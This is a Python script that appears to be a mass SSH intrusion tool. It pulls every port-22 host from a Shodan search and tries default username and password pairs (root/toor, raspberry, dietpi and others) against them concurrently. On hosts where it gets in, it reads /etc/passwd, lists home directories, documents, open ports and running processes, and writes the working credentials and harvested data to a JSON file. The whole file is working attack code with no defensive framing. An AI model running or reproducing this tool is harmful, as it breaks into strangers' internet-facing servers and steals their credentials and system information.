
import datetime
import paramiko
import shodan
import asyncio
import json



def cd_At(ssh, yon):
    list = []
    try:
        if (yon == "etc"):
            stdin, _stdout, _stderr = ssh.exec_command("cd /home/../etc ; ls")
            sk = _stdout.read().decode().strip()
            for m in sk.split():
                if (m == "passwd"):
                    b ={}
                    stdin, _stdout, _stderr = ssh.exec_command("cd /home/../etc ; cat passwd")
                    sk = _stdout.read().decode().strip()
                    b = {"passwd": sk}
                    list.append(b)

                elif (m == "passwd-"):
                    b = {}
                    stdin, _stdout, _stderr = ssh.exec_command("cd /home/../etc ; cat passwd-")
                    sk = _stdout.read().decode().strip()
                    b["passwd-"] = sk
                    list.append(b)
                elif (m == "security"):
                    b = {}
                    ls =[]
                    stdin, _stdout, _stderr = ssh.exec_command("cd /home/../etc ; ls security")
                    sk = _stdout.read().decode().strip()
                    for line in sk.split():
                        ls.append(line)
                    b["security list"] = ls
                    list.append(b)


                elif (m == "passwd-"):
                    pass
        elif (yon == "var"):
            stdin, _stdout, _stderr = ssh.exec_command("cd /home/../var ; ls")
            sk = _stdout.read().decode().strip()
            for m in sk.split():
                if(m == "log"):
                    pass
                elif m == "wtmp":
                    pass

        elif (yon == "Documents"):
            (stdin, stdout, stderr) = ssh.exec_command("cd " + yon + " ; ls")
            sk1 = stdout.read().decode().strip()
            lstex= []
            Documents = {}
            for line in sk1.split():
                lstex.append(line)
            Documents["docs"] = lstex
            return  Documents

        (stdin, stdout, stderr) = ssh.exec_command("cd..")
    except:
        pass
    return list





def ls_At1(ssh):
    list = []
    _stdin, _stdout, _stderr = ssh.exec_command("ls")
    sk= _stdout.read().decode().strip()
    for line in sk.split():
        if (line == "etc"):
            list.append(cd_At(ssh, "etc"))
        elif line == "Documents":
            list.append(cd_At(ssh, "Documents"))
        elif (line == "var"):
            list.append(cd_At(ssh, "var"))
        elif (line == "j"):
            list.append(cd_At(ssh, "home"))
        elif (line == "history"):
            list.append("history")
        elif (line == "readme.txt"):
            list.append("readme.txt")

    _stdin, _stdout, _stderr = ssh.exec_command("cd  .. ; pwd" )
    sk= _stdout.read().decode().strip()
    if(sk == "/home"):
        k = []
        stdin, _stdout, _stderr = ssh.exec_command("cd  .. ;ls")
        sk = _stdout.read().decode().strip()
        for m in sk.split():
            k.append(m)
        list.append({'users under home': k})
    else:
        pass

    _stdin, _stdout, _stderr  = ssh.exec_command("cd /home/.. ; pwd" )
    sk= _stdout.read().decode().strip()
    if(sk == "/"):
        k = {}
        stdin, _stdout, _stderr = ssh.exec_command("cd /home/.. ;ls")
        sk = _stdout.read().decode().strip()
        for m in sk.split():
            if(m == "var"):
                list.append(cd_At(ssh,"var"))
            elif(m == "etc"):
                list.append(cd_At(ssh,"etc"))

    else:
        pass

    for line in sk.split():
        pass

    _stdin, _stdout, _stderr = ssh.exec_command("netstat -tulpn | grep LISTEN")
    sk9 = _stdout.read().decode().strip()

    di = {}
    l22s =  []

    sk9 = sk9.split()
    sk9 = sk9[:len(sk9)]
    sk9 = [sk9[i:i + 6] for i in range(0, len(sk9), 7)]
    for m in sk9:

        l22s.append(m)
    di["open ports"]= l22s
    list.append(di)
    d2 = {}

    ls_to_be_Added = []
    _stdin, _stdout, _stderr = ssh.exec_command("ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%mem | head")
    sk10 = _stdout.read().decode()
    sk10= sk10.replace('-c' , '')
    sk10 = sk10.replace('-n', '')
    sk10 = sk10[4:len(sk10)]
    sk10= sk10.split()
    amount = 5
    for x in range((len(sk10))):
        if x % 5 == 0 and x >= 5 and x+4 <= len(sk10)  and x <= (amount)*5 :
            ls_to_be_Added.append({"PID": sk10[x], "PPID":sk10[x+1] ,  "CMD": sk10[x+2] ,"%MEM": sk10[x+3], "%CPU":sk10[x+4] })

    d2["top proceses"] = ls_to_be_Added
    list.append(d2)


    return (list[0],list[1],list[2][0],list[2][1],list[2][2],list[4],list[5])

def send_command(ssh):
    retrn = []

    command = "ls /"
    (stdin, stdout, stderr) = ssh.exec_command(command)
    for line in stdout.readlines():
        if [line[len(line) - 1] == "/n"]:
            line = line[0:len(line) - 1]
        retrn.append(line)
    return retrn



async def a_t_request_Ssh(ip,x,y):
    return_data = None
    try:
        client = paramiko.client.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, username=x, password=y, timeout=10)
        di = {}
        di = {'name': x, 'password': y}

        Convertme_to_json[ip] = {"credentials": di}

        print(ip,x,y,'succeses')

        return_data = {
            'ip': ip,
            'name': x,
            'pass': y
        }
        for x in (ls_At1(client)):
            keys_list = list(x)
            values = x.values()
            values_list = list(values)
            if keys_list[0] == "docs" or keys_list[0] == "users under home" or keys_list[0] == "security list" or \
                    keys_list[0] == "open ports" or keys_list[0] == "top proceses":
                Convertme_to_json[ip].update(x)
            else:
                Convertme_to_json[ip][keys_list[0]] = [values_list[0]]

    except:
        print(ip,x,y,'failure')
    return return_data
async def a_t_connect():
    task_lst= []
    try:
        for x in user_nam_common:
            for y in user_pas_common:
                for ip in laz_ip:
                  task_lst.append(asyncio.create_task(a_t_request_Ssh(ip,x,y)))
    except:
        pass


    return await asyncio.gather(*task_lst)


def a_try_connect():

    testnum = (laz_ip.__sizeof__()) / 8
    re = laz_ip.__sizeof__() - (int(testnum)) * 8

    uga = datetime.datetime.now()
    result_ls = asyncio.run(a_t_connect())
    result_ls= list(filter(None,result_ls))
    zaman = datetime.datetime.now() - uga
    print('::::::::', zaman, '\n')


def test_list(api={}):
    try:
        results = api.search('port:22')

        for result in results['matches']:
            laz_ip.append(result['ip_str'])

    except shodan.APIError as e:
        pass


dummy_files = []
laz_ip = []
user_nam_common = ["root","test","admin","oracle"]
user_pas_common = ["test","root","toor","raspberry","dietpi","test","password","admin","administrator","uploader","qwerty","12345678","12345","webadmin","webmaster","maintenance"]
Convertme_to_json= {}
f = open('./key.txt', 'r')
apikey = f.readline().strip()
f.close()

api = shodan.Shodan(apikey)

test_list(api)

uga1 = datetime.datetime.now()


a_try_connect()



print('son zman :', datetime.datetime.now() - uga1)

print("end")

with open("test.json", "w") as outfile:
    json.dump(Convertme_to_json, outfile)
